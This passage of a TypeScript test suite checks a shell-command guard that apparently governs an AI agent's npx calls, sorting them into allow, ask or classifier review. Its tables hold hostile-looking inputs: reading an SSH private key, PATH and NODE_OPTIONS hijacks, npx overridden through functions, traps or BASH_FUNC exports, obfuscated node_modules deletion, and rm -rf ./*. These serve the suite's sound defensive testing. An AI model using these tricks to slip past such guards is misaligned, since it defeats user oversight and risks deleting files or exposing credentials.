    "npx tsc --noEmit", "npx eslint .", "npx jest", "CI=true npx jest", "timeout 120 npx jest", "cd packages/a && npx tsc", "rm -rf dist && npx tsc --noEmit", "npx --no-install tsc",
    "npx prettier --check .", "npx prettier --write src", "npx vitest run", "npx vitest run --coverage", "npx tsc -p tsconfig.json", "npx tsc --noEmit 2>&1 | head -20", "npx tsc --noEmit 2>&1 | tail -5", "npx eslint src --ext .ts", "npx eslint --fix src/a.ts", "npx jest --watchAll=false",
    "npx jest src/a.test.ts -t 'adds'", "npx tsc && echo ok", "npx tsc || echo failed", "npx tsc --noEmit && npx eslint .", "npx tsc --noEmit; npx jest", "FORCE_COLOR=1 npx jest", "NODE_ENV=test npx mocha", "NODE_OPTIONS=--max-old-space-size=4096 npx tsc", "time npx tsc", "timeout 60 npx tsc --noEmit",
    "cd src && npx tsc", "(cd packages/a && npx tsc --noEmit)", "npx vite build", "npx playwright test", "npx ts-node src/a.ts", "npx next build", "npx webpack --mode production", "npx rollup -c", "npx tsx src/a.ts", "npx --no tsc --noEmit",
    "npx tsc --noEmit > /dev/null 2>&1", "if npx tsc --noEmit; then echo ok; fi", "npx astro check", "npx biome check .", "env npx tsc", "nice npx tsc", "command npx tsc", "nohup npx tsc", "exec npx tsc", "npx tsc | cat",
    "npx tsc & wait", "npx 'tsc'", "\\npx tsc", "'npx' tsc", "bash -c 'npx tsc'", "sh -c 'npx tsc'", "{ npx tsc; }", "! npx tsc", "cd \"$(git rev-parse --show-toplevel)\" && npx tsc",
    // (`npx tsc eslint` once the braces are expanded; a program named at run time.)
    "npx {tsc,eslint}", "$(echo npx) tsc", "n=npx; $n tsc",
    // Fifth pass: asks of the fourth pass that the one rule leaves to the model (no part of the
    // call spells node_modules), and its table of the model.
    "rm -rf node_mod*; npx tsc", "echo x > .npmrc; npx tsc",
    ...D5_MODEL,
  ];
  // The forms that ask, the tool installed or not.
  const ASKS: string[] = [
    "npx cowsay hi", "npx create-react-app x", "npx -y tsc", "npx --yes tsc", "npx -p typescript tsc", "npx --package=typescript tsc", "npx -c 'tsc'", "npx --call 'tsc'", "npx -- tsc", "npx tsc@latest", "npx tsc@5 --noEmit", "npx @biomejs/biome check .", "npx @scope/tsc", "npx ./local.js", "npx -q tsc", "npx --quiet tsc",
    "npx --prefix . tsc", "npx -w a tsc", "npx --workspace=a tsc", "npx --workspaces tsc", "npx", "npx --no-install", "npx --version", "npx --no-install cowsay", "npx --no cowsay hi", "npx --no-install id", "npx --no-install sh -c id",
    "npm exec tsc", "npm exec -- tsc --noEmit", "npm exec --no-install tsc", "npm exec --no -- tsc", "npm x tsc", "npm x -- tsc", "pnpx tsc", "pnpx --no-install tsc", "pnpm dlx tsc", "yarn dlx tsc", "bunx tsc", "bunx --no-install tsc", "bun x tsc", "uvx ruff", "pipx run cowsay",
    "/usr/bin/npx tsc", "./bin/npx tsc", "bin/npx tsc", "xargs npx tsc", "echo tsc | xargs npx", "find . -name '*.ts' -exec npx prettier --check {} +", "git ls-files '*.ts' | xargs npx eslint", "sudo npx tsc", "env -i npx tsc", "env -u CI npx tsc",
    "npm_config_yes=true npx tsc", "NPM_CONFIG_PACKAGE=evil npx tsc", "npm_config_script_shell=./x npx tsc", "NODE_OPTIONS=--require=./x.js npx tsc", "HOME=$PWD/h npx tsc", "PATH=$PWD/evil:$PATH npx tsc",
    "cd /tmp && npx tsc", "cd .. && npx tsc", "npx $(echo tsc)", "npx \"$y\"", "eval 'npx cowsay'", "sh -c 'npx cowsay'", "bash -c 'npx -y tsc'",
    "npx tsc < ~/.ssh/id_ed25519", "function npx { echo x; }; npx tsc", "npx() { echo x; }; npx tsc", "alias npx=echo; npx tsc", "rm -rf node_modules; npx tsc", "for i in 1 2; do npx tsc; rm -rf node_modules; done",
    // Fifth pass: the model in the fourth pass, an ask by the one rule; and its table of asks.
    "rm -rf node_modules/.cache && npx tsc", "ls node_modules/.bin; npx tsc",
    ...D5_ASKS,
  ];
  const ends = async (where: string, c: string, session?: SessionState) => {
    const d = await decideShell(guard, session ?? new SessionState(where), where, c);
    // Exactly one of the two: a rule allow of any kind (one that would run, or one the sandbox
    // cannot run, which `outcomeIn` reports as another kind) is neither.
    return d.by === "no-model" ? "the model" : d.effect === "ask" ? "ask" : `${d.effect} by ${d.by}`;
  };
  for (const [want, forms] of [["the model", EVERYDAY], ["ask", ASKS]] as [string, string[]][]) {
    for (const c of forms) {
      test(`${want}, in a session that wrote nothing and in one that wrote a file: ${JSON.stringify(c)}`, async () => {
        assert.equal(await ends(dir, c), want, c);
        const session = new SessionState(dir);
        assert.equal((await outcomeIn(dir, "printf 'x' > notes.txt", session)).kind, "allow");
        assert.equal(await ends(dir, c, session), want, `after a write: ${c}`);
      });
    }
  }
  test("with nothing installed, every form of both lists is an ask or the model, and every bare npx form asks", async () => {
    for (const c of [...EVERYDAY, ...ASKS]) {
      const got = await ends(bare, c);
      assert.ok(got === "ask" || got === "the model", `${c}: ${got}`);
      // (A place the check cannot tell stays with the model.)
      if (/^npx (?!.*\$\()/.test(c) && !c.includes("node_modules")) assert.equal(got, "ask", c);
    }
  });
  test("under a user's allow rule for npx, every form of both lists ends as without it", async () => {
    const own: Guard = { ...guard, rules: compileRules({ ask: DEFAULT_ASK, allow: ["npx *", "npx tsc --noEmit", "command *", "/usr/bin/npx *"] }) };
    for (const c of [...EVERYDAY, ...ASKS]) {
      const d = await decideShell(own, new SessionState(dir), dir, c);
      const got = d.by === "no-model" ? "the model" : d.effect === "ask" ? "ask" : `${d.effect} by ${d.by}`;
      assert.ok(got === "ask" || got === "the model", `${c}: ${got}`);
    }
  });
  // The variant check's pins that hold (its group G), with what each reason says.
  npxCases(() => dir, "classify", [
    ["FORCE_COLOR=1 npx jest", NPX_HAS("jest")],
    ["NODE_OPTIONS=--max-old-space-size=4096 npx tsc", NPX_HAS("tsc")],
    ["timeout 120 npx jest", NPX_HAS("jest")],
    ["npx tsc --noEmit; npx jest", /\(npx (tsc|jest): the project has node_modules\/\.bin\//],
    ["cd src && npx tsc", NPX_HAS("tsc")],
    ["rm -rf dist && npx tsc", NPX_HAS("tsc")],
    ["npx tsc node_modules/x", NPX_HAS("tsc")],
  ]);
  npxCases(() => dir, "ask", [
    ["NODE_OPTIONS=--require=./x.js npx tsc", /NODE_OPTIONS/],
    ["HOME=$PWD/h npx tsc", /HOME/],
    ["PATH=$PWD/evil:$PATH npx tsc", /PATH/],
    ["xargs npx tsc", NPX_OLD_ASK],
    ["npx @biomejs/biome check .", /^npx @biomejs\/biome: only --no-install or --no and then a plain program name are read/],
    ["npx -q tsc", /^npx -q: only --no-install or --no/],
    ["npm exec tsc", /^npm exec installs packages/],
    ["pnpm dlx tsc", /^pnpm dlx installs packages/],
    ["bunx tsc", /^bunx downloads and runs a package$/],
    ["npx tsc < ~/.ssh/id_ed25519", /credential/],
  ]);

  // What the model is shown with an npx (the reading's two changes of the third pass that had
  // no test): the last three files the session wrote, and an output sent to /dev/null or to a
  // descriptor is none of them.
  test("the model is shown the last three files the session wrote, not counting /dev/null", async () => {
    const seen: string[] = [];
    const server = http.createServer((req, res) => {
      let text = "";
      req.on("data", (c) => (text += c));
      req.on("end", () => {
        seen.push(text);
        res.setHeader("content-type", "application/json");
        res.end(JSON.stringify({ answers: { risky: { noul: 0.01 } } }));
      });
    });
    await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
    const names = ["w1.txt", "w2.txt", "w3.txt", "w4.txt", "w5.txt"];
    try {
      const model: Guard = { ...guard, useClassifier: true, classifier: { ...DEFAULT_CLASSIFIER, endpoint: `http://127.0.0.1:${(server.address() as { port: number }).port}` } };
      const session = new SessionState(dir);
      for (const n of names) {
        const d = await decideShell(model, session, dir, `printf 'mark-${n}\\n' > ${n}`);
        assert.equal(d.effect, "allow", d.reason);
        fs.writeFileSync(path.join(dir, n), `mark-${n}\n`);
      }
      for (const c of ["echo x > /dev/null", "echo y 2> /dev/null", "echo z > /dev/stdout"]) assert.equal((await decideShell(model, session, dir, c)).effect, "allow", c);
      seen.length = 0;
      const d = await decideShell(model, session, dir, "npx jest");
      assert.equal(d.by, "model", d.reason);
      assert.equal(seen.length, 1);
      for (const n of names.slice(-3)) assert.match(seen[0], new RegExp(`mark-${n}`), n);
      for (const n of names.slice(0, 2)) assert.doesNotMatch(seen[0], new RegExp(`mark-${n}`), n);
    } finally {
      server.close();
      for (const n of names) fs.rmSync(path.join(dir, n), { force: true });
    }
  });
});

// ---- fifth pass: the tests (the tables are above the fourth pass (7), whose sweep runs them) ----

const D5_DEFINED = /^the call defines a function or an alias named npx: the word npx then runs that, not npm's npx$/;
const d5Project = (name: string) => {
  const dir = project(
    name,
    { "package.json": PKG({ scripts: { reset: "rm -rf node_modules" } }), "package-lock.json": "{}\n", "src/a.ts": "", "packages/a/package.json": PKG({ name: "a" }), Makefile: "reset:\n\trm -rf node_modules\n", "reset.sh": "#!/bin/sh\nrm -rf node_modules\n", "other.json": "{}\n", "tsconfig.json": "{}\n", "a.log": "" },
    [...TOOLS, "vite", "rimraf"],
  );
  exec(path.join(dir, "reset.sh"));
  write(path.join(dir, "node_modules", "typescript", "package.json"), PKG({ name: "typescript" }));
  return dir;
};

describe("r4 28, fifth pass (1): an npx the reading sends to the model asks when any other part of the call spells node_modules", () => {
  let dir = "";
  before(() => {
    dir = d5Project("npx5-rule");
  });
  // Each exactly an ask, with the rule's one reason, which names the command and the word.
  npxCases(() => dir, "ask", [...D5_STRINGS, ...D5_ELSEWHERE].map((c) => [c, NPX_OTHER] as [string, RegExp]));
  npxCases(() => dir, "ask", D5_OTHERWISE);
  test("the reason names the rule, the command and the word it found", async () => {
    for (const [c, found] of [
      ["rm -rf node_modules/.cache && npx tsc", "rm: node_modules/.cache"],
      ["ls node_modules/.bin; npx tsc", "ls: node_modules/.bin"],
      ["npx tsc > node_modules/.bin/tsc", "npx: node_modules/.bin/tsc"],
      ["FOO=node_modules npx tsc", "npx: FOO=node_modules"],
      ["trap 'rm -rf node_modules' DEBUG; npx tsc", "trap: rm -rf node_modules"],
      ["rm -rf node_mod''ules; npx tsc", "rm: node_modules"],
      ["npx eslint . --ignore-pattern node_modules && npx tsc", "npx: node_modules"],
      ["sh <<EOF\nrm -rf node_modules\nEOF\nnpx tsc", "the call's text: rm -rf node_modules"],
    ]) {
      const got = await outcomeIn(dir, c);
      assert.equal(got.kind, "ask", `${c}: ${got.reason}`);
      assert.equal(NPX_OTHER.exec(got.reason)?.[1], found, `${c}: ${got.reason}`);
    }
  });
  // The rule is about an npx the reading would send to the model: one that asks anyway keeps its
  // own reason, and a call without an npx is not touched.
  npxCases(() => dir, "ask", [
    ["rm -rf node_modules; npx cowsay", /^npx cowsay: the project has no node_modules\/\.bin\/cowsay/],
    ["ls node_modules; npx -y tsc", /^npx -y: /],
  ]);
  npxCases(() => dir, "allow", ["ls node_modules/.bin", "echo node_modules"]);
});

describe("r4 28, fifth pass (2): nothing else about the other commands is read", () => {
  let dir = "";
  before(() => {
    dir = d5Project("npx5-model");
  });
  // The 54 calls the fourth pass newly asked about, and the everyday forms: each exactly the
  // model, with the reading's reason.
  npxCases(() => dir, "classify", [...D5_NEW_ASKS, ...D5_EVERYDAY].map((c) => [c, /\(npx (tsc|eslint|jest): the project has node_modules\/\.bin\//] as [string, RegExp]));
  npxCases(() => dir, "classify", D5_SCRIPT.map((c) => [c, NPX_OR_SCRIPT] as [string, RegExp]));
  // LEFT TO THE MODEL ON PURPOSE (see D5_ON_PURPOSE): a spelling without the letters, a command
  // that removes or swaps the tool without naming it, a change of what npm reads. The fourth
  // pass asked about some of these and missed others; the maintainer's rule reads none of them.
  npxCases(() => dir, "classify", D5_ON_PURPOSE.map((c) => [c, /\(npx (tsc|rimraf): the project has node_modules\/\.bin\//] as [string, RegExp]));
  // These remove the tool without spelling the name too, and ask all the same: by a rule about
  // the other command, which is not the npx's and was there before the round.
  npxCases(() => dir, "ask", [
    ["git clean -fdx; npx tsc", /^git clean -f deletes untracked files$/],
    ["mv * ../gone; npx tsc", /^mv writes outside the working directory/],
    ["rm -rf ./*; npx tsc", /^rm -r of \.\/\* deletes the whole project or its git data$/],
  ]);
  // A name put together from a variable the call gives a literal: the decision judges the word
  // with the literal in it, as it does everywhere (r4 27), so this one spells the name.
  npxCases(() => dir, "ask", [["n=node_; rm -rf \"${n}modules\"; npx tsc", NPX_OTHER]]);
});

describe("r4 28, fifth pass (3): two more spellings of a function named npx", () => {
  let dir = "";
  before(() => {
    dir = d5Project("npx5-fn");
  });
  // The pattern tests the printed text, in which `npx() {` inside a string is `npx\(\)' {'`: a
  // trap whose code defines the function went to the model, and bash ran the function. And an
  // exported function handed to a shell by env, in a word the guard reads as no assignment.
  npxCases(() => dir, "ask", [
    ["trap 'npx() { id; }' DEBUG; npx tsc", D5_DEFINED],
    ["trap -- \"npx() { echo EVIL; }\" DEBUG; npx tsc", D5_DEFINED],
    ["trap 'npx () { id; }' DEBUG; npx tsc", D5_DEFINED],
    ["trap 'npx(){ echo x; }' ERR; false; npx tsc", D5_DEFINED],
    ["trap 'npx() { :; }' DEBUG\nnpx --no-install tsc", D5_DEFINED],
    ["trap 'npx() { :; }' DEBUG; CI=1 npx tsc", D5_DEFINED],
    ["env 'BASH_FUNC_npx%%=() { id; }' bash -c 'npx tsc'", D5_DEFINED],
    ["env 'BASH_FUNC_npx%%=() { id; }' sh -c 'npx tsc'", D5_DEFINED],
    ["env \"BASH_FUNC_npx%%=() { id; }\" bash -c 'npx tsc'", D5_DEFINED],
  ]);
  // False asks of the pattern, kept as they are (it tests text, not what the shell defines): a
  // string that only talks about such a function. The first asked before this pass.
  npxCases(() => dir, "ask", [
    ["echo 'function npx is documented' && npx tsc", D5_DEFINED],
    ["echo 'npx() is how you call it' && npx tsc", D5_DEFINED],
  ]);
  npxCases(() => dir, "classify", [
    // (env starts the program npx, not a shell: no function is imported, and the real npx runs.
    // The words are not read as an npx at all: as before this pass.)
    ["env 'BASH_FUNC_npx%%=() { id; }' npx tsc", /unknown command BASH_FUNC_npx%%=/],
    ["mynpx() { echo x; }; npx tsc", NPX_HAS("tsc")],
    ["echo 'npx is how you call it' && npx tsc", NPX_HAS("tsc")],
  ]);
});

describe("r4 28, fifth pass (4): the everyday forms, and a word that is only looked up stands before the npx", () => {
  let dir = "";
  before(() => {
    dir = d5Project("npx5-everyday");
  });
  // With the tool installed. The model:
  npxCases(() => dir, "classify", [
    ["npx tsc --noEmit", NPX_HAS("tsc")],
    ["npx eslint .", NPX_HAS("eslint")],
    ["npx jest", NPX_HAS("jest")],
    ["CI=true npx jest", NPX_HAS("jest")],
    ["timeout 120 npx jest", NPX_HAS("jest")],
    ["cd packages/a && npx tsc", NPX_HAS("tsc")],
    ["rm -rf dist && npx tsc --noEmit", NPX_HAS("tsc")],
    ["git add package.json && npx tsc", NPX_HAS("tsc")],
    ["git diff package.json && npx tsc --noEmit", NPX_HAS("tsc")],
    ["npx eslint . --ignore-pattern node_modules", NPX_HAS("eslint")],
    ["npx tsc && npx eslint .", /\(npx (tsc|eslint): the project has node_modules\/\.bin\//],
  ]);
  // An ask:
  npxCases(() => dir, "ask", [
    ["rm -rf node_modules && npm ci && npx tsc", /./],
    ["ls node_modules/.bin; npx tsc", NPX_OTHER],
  ]);
  // The reading's missing test of the fourth pass (guard.ts, the npx branch of argvGuard: `last <
  // at`): `command -v` lets a word through only where the word is what it looks up, which stands
  // behind it. Without the condition these went to the model (xcheck/d5/mutation/).
  npxCases(() => dir, "ask", [
    ["find . -maxdepth 0 -exec npx cowsay \\; -exec command -v x \\;", NPX_OLD_ASK],
    ["find . -maxdepth 0 -exec /usr/bin/npx cowsay \\; -exec command -v x \\;", NPX_OLD_ASK],
    ["find . -maxdepth 0 -exec bunx cowsay \\; -exec command -v x \\;", /^bunx downloads and runs a package$/],
  ]);
});

// The two checks of the fifth pass (a reading and a variant check with the real, offline npx)
// found the text reading's cut wrong both ways: a here-document line that holds `npx tsc` lost
// the letters behind it (`rm -rf npx tsc node_modules` handed to a shell: the tool was gone and
// npx went to fetch), and an operator inside a quoted argument of the npx itself ended the cut,
// so jest's own `--testPathIgnorePatterns '/dist/|/node_modules/'` asked. The cut is gone. The
// words decide (they leave out exactly the npx's own arguments), and the one thing that is no
// word, a here-document's body, is read as text: in a call that holds a `<<` the letters
// anywhere in its text ask. The letters count with the quotes and backslashes of a string taken
// out as well (`trap 'rm -rf node_mod""ules' DEBUG`).
describe("r4 28, fifth pass (5): the words decide, and a here-document's body is read as text", () => {
  let dir = "";
  before(() => {
    dir = d5Project("npx5-text");
  });
  npxCases(() => dir, "ask", [
    "sh <<EOF\nrm -rf npx tsc node_modules\nEOF\nnpx tsc",
    "sh <<'EOF'\nrm -rf npx tsc node_modules\nEOF\nnpx tsc",
    "cat <<EOF | sh\nrm -rf npx tsc node_modules\nEOF\nnpx tsc",
    "cat <<EOF\nnpx tsc node_modules\nEOF\nnpx tsc",
    "sed 's/^npx tsc //' <<EOF | sh\nnpx tsc rm -rf node_modules\nEOF\nnpx tsc",
    "python3 <<EOF\nx='npx tsc' + 'node_modules'\nEOF\nnpx tsc",
    "trap 'rm -rf node_mod\"\"ules' DEBUG; npx tsc",
    "trap 'rm -rf node_mod\\ules' DEBUG; npx tsc",
    "trap \"rm -rf node_mod''ules\" DEBUG; npx tsc",
    "bash <<< 'rm -rf node_mod\"\"ules'; npx tsc",
    "echo 'rm -rf node_mod\"\"ules' | sh; npx tsc",
    "sh <<EOF\nrm -rf node_mod\"\"ules\nEOF\nnpx tsc",
    "sh <<'EOF'\nrm -rf node_mod\\ules\nEOF\nnpx tsc",
  ].map((c) => [c, NPX_OTHER] as [string, RegExp]));
  // The npx's own arguments, with an operator character inside a quoted one or a substitution
  // among them: the tool's business, as any other argument of it.
  npxCases(() => dir, "classify", [
    "npx jest --testPathIgnorePatterns '/dist/|/node_modules/'",
    "npx jest --testPathIgnorePatterns '<rootDir>/node_modules/'",
    "npx jest --coveragePathIgnorePatterns 'dist|node_modules'",
    "npx eslint . --ignore-pattern '(dist|node_modules)'",
    "npx tsc --noEmit --exclude 'dist|node_modules'",
    "npx eslint . --ignore-pattern 'a&b' --ignore-pattern node_modules",
    "npx eslint --rule 'a|node_modules' .",
    "npx eslint $(git diff --name-only) --ignore-pattern node_modules",
    "npx tsc 'a;b' node_modules",
  ].map((c) => [c, /\(npx (tsc|eslint|jest): the project has node_modules\/\.bin\//] as [string, RegExp]));
  // The cost of reading a body as text: in a call that holds a `<<`, the npx's own arguments
  // ask too (which lines of the text are a body is not read).
  npxCases(() => dir, "ask", [
    ["npx eslint . --ignore-pattern node_modules <<< x", NPX_OTHER],
    ["cat <<EOF > notes.txt\nplain\nEOF\nnpx eslint . --ignore-pattern node_modules", NPX_OTHER],
  ]);
  // LEFT TO THE MODEL ON PURPOSE, as D5_ON_PURPOSE: the name put together when the string runs
  // (braces and a variable inside a string no shell of the call's text reads), and a git
  // message, which the decision judges as the one word `message` and which runs nothing.
  npxCases(() => dir, "classify", [
    "trap 'rm -rf node_{modules,x}' DEBUG; npx tsc",
    "n=node_; trap 'rm -rf ${n}modules' DEBUG; npx tsc",
    "n=node_; sh <<EOF\nrm -rf ${n}modules\nEOF\nnpx tsc",
    "git commit -m 'ignore node_modules' && npx tsc",
    "git commit -qm \"chore: bump node_modules cache key\" && npx tsc --noEmit",
  ].map((c) => [c, /\(npx tsc: the project has node_modules\/\.bin\//] as [string, RegExp]));
});
